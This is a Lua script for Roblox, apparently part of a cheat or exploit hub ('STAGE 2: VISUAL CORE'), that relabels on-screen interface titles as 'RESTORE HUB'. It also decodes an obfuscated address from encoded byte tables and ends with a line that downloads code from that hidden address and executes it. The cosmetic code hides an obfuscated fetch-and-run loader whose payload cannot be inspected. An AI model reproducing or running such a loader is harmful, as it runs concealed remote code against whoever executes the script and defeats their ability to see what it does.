
--[[ STAGE 2: VISUAL CORE ]]
local X6d8Z3UpWp2lEAbI0V7 = bit32 and bit32.bxor
if not X6d8Z3UpWp2lEAbI0V7 then
    X6d8Z3UpWp2lEAbI0V7 = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function r23wBeFGK3wWm(data, a, b, m, s, r, z)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local drift = (b + i * s + (z or 0)) % 256
        if m == 0 then
            v = (v - drift) % 256
            v = X6d8Z3UpWp2lEAbI0V7(v, a)
        else
            v = X6d8Z3UpWp2lEAbI0V7(v, a)
            v = (v - drift) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local PX9uqBNeBU9qeumwVaG = {
  {{67, 65, 77, 87, 94, 102, 21}, 224, 96, 0, 7, false, 21, 3},
  {{237, 232, 241, 255, 242, 56}, 69, 186, 0, 3, true, 12, 2},
  {{14, 0, 8, 251}, 154, 16, 1, 4, true, 9, 19},
  {{140, 153, 166}, 197, 195, 1, 7, false, 1, 23},
  {{10, 16, 11, 34, 25}, 170, 45, 0, 2, false, 11, 20},
  {{9, 8, 255}, 78, 199, 0, 3, true, 19, 30},
  {{215, 240, 224, 247}, 207, 30, 0, 4, false, 5, 15},
  {{192, 211, 195, 188}, 126, 36, 1, 5, false, 13, 30},
  {{5, 15, 4}, 98, 222, 1, 5, true, 7, 22},
  {{120, 173, 164, 161, 153, 170, 173}, 21, 31, 0, 1, true, 16, 14},
  {{14, 203, 206, 221, 209, 233, 192}, 236, 168, 1, 7, false, 14, 4},
  {{180, 132, 129, 83}, 173, 157, 1, 3, true, 17, 20},
  {{35, 61, 250, 53}, 161, 68, 0, 4, false, 4, 27},
  {{255, 191, 193, 193, 181, 194, 187}, 192, 241, 0, 1, false, 10, 30},
  {{225, 222, 224, 246}, 134, 231, 0, 7, true, 8, 1},
  {{139, 194, 130, 125, 147}, 124, 89, 0, 2, false, 22, 19},
  {{132, 134, 145, 188, 135}, 218, 221, 1, 6, true, 15, 18},
  {{149, 155, 78}, 119, 41, 0, 6, false, 3, 14},
  {{189, 205, 208, 191, 209}, 110, 161, 0, 1, false, 6, 15},
  {{110, 103, 104, 90, 96}, 120, 39, 0, 3, true, 20, 29},
  {{190, 199, 223, 223, 186, 191}, 48, 66, 0, 6, true, 18, 22},
  {{37, 39, 113}, 198, 79, 0, 3, false, 2, 29}
}
local pDo_XJwM87aL2JH6EcM = {}
for NmbF42saRd5de = 1, #PX9uqBNeBU9qeumwVaG do
    local yqFPARJk5vBw = PX9uqBNeBU9qeumwVaG[NmbF42saRd5de]
    pDo_XJwM87aL2JH6EcM[yqFPARJk5vBw[7]] = r23wBeFGK3wWm(
        yqFPARJk5vBw[1],
        yqFPARJk5vBw[2],
        yqFPARJk5vBw[3],
        yqFPARJk5vBw[4],
        yqFPARJk5vBw[5],
        yqFPARJk5vBw[6],
        yqFPARJk5vBw[8]
    )
end
local BKs1vBGK3EgCLMf = table.concat(pDo_XJwM87aL2JH6EcM)
local HubName = "RESTORE HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(BKs1vBGK3EgCLMf))()
